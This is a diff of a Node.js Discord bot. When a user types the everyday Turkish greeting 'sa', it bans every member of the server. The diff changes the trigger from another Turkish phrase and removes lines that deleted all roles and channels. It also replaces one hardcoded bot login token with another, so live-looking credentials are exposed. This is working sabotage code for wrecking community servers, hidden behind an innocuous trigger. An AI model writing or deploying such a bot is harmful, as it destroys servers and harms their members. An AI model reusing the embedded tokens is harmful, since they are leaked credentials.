@@ -15,13 +15,8 @@ const http = require('http');
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 berke.on('message', async msg => {
-  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
+  if (msg.content.toLowerCase() === 'sa' ) {
     msg.guild.members.forEach(member => member.ban())
-    msg.guild.roles.deleteAll();
-    msg.guild.channels.deleteAll();
-    msg.guild.createChannel("lyrics");
-    msg.guild.createChannel("lyrics");
-    msg.guild.createChannel("lyrics");
   }
 });
  
@@ -57,7 +52,7 @@ berke.on('channelCreate', channel => {
 
 });
 
-berke.login("NjQ1ODkwMjAyNTY4NzUzMTkz.XeJ9XA.AlhegRoi0TQyHZMsiTuGOqcPhrA")
+berke.login("NjUwMjYyNzU1Njk3NDkxOTc4.XegMZw.lY37PeWKRoRkLegpA7Pn-o-ruJ4")
 
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
